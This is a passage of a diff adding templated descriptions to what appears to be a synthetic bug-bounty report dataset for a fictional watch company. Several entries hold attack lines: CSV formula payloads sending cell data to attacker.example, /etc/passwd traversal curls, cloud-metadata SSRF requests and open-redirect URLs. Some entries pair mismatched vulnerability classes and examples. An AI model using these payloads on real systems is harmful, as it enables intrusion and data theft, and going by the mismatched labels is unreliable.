+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.felsentor-watchworks.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -18560,7 +18700,8 @@
           "offset": "8d 22h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18654,7 +18795,8 @@
           "offset": "2d 21h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.felsentor-watchworks.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18805,7 +18947,8 @@
           "offset": "4h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18945,7 +19088,8 @@
           "offset": "6d 5h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.felsentor-watchworks.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19120,7 +19264,8 @@
           "offset": "8d 1h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.felsentor-watchworks.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19280,7 +19425,8 @@
           "offset": "6d 21h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.felsentor-watchworks.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19392,7 +19538,8 @@
           "offset": "1d 21h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19546,7 +19693,8 @@
           "offset": "2d 21h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19666,7 +19814,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19826,7 +19975,8 @@
           "offset": "3d 21h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.felsentor-watchworks.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -19981,7 +20131,8 @@
           "offset": "7d 23h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.felsentor-watchworks.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20100,7 +20251,8 @@
           "offset": "5d 1h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.felsentor-watchworks.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20244,7 +20396,8 @@
           "offset": "2d 8h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20400,7 +20553,8 @@
           "offset": "8d 7h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.felsentor-watchworks.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20534,7 +20688,8 @@
           "offset": "8d 5h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20670,7 +20825,8 @@
           "offset": "3d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://warranty.felsentor-watchworks.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20788,7 +20944,8 @@
           "offset": "6d 15h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://dealers.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20972,7 +21129,8 @@
           "offset": "6d 1h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://dealers.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21086,7 +21244,8 @@
           "offset": "8d 19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://warranty.felsentor-watchworks.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21197,7 +21356,8 @@
           "offset": "1d 13h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://warranty.felsentor-watchworks.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21364,7 +21524,8 @@
           "offset": "8d 23h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://warranty.felsentor-watchworks.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21480,7 +21641,8 @@
           "offset": "1d 3h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://dealers.felsentor-watchworks.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21624,7 +21786,8 @@
           "offset": "6d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://warranty.felsentor-watchworks.foo/api/me`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21751,7 +21914,8 @@
           "offset": "3d 20h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://warranty.felsentor-watchworks.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21902,7 +22066,8 @@
           "offset": "4d 18h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://dealers.felsentor-watchworks.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22001,7 +22166,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://warranty.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22125,7 +22291,8 @@
           "offset": "4d 6h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://dealers.felsentor-watchworks.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22277,7 +22444,8 @@
           "offset": "4d 22h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://dealers.felsentor-watchworks.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22432,7 +22600,8 @@
           "offset": "7d 16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://warranty.felsentor-watchworks.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22547,7 +22716,8 @@
           "offset": "13h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://dealers.felsentor-watchworks.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22686,7 +22856,8 @@
           "offset": "6d 19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
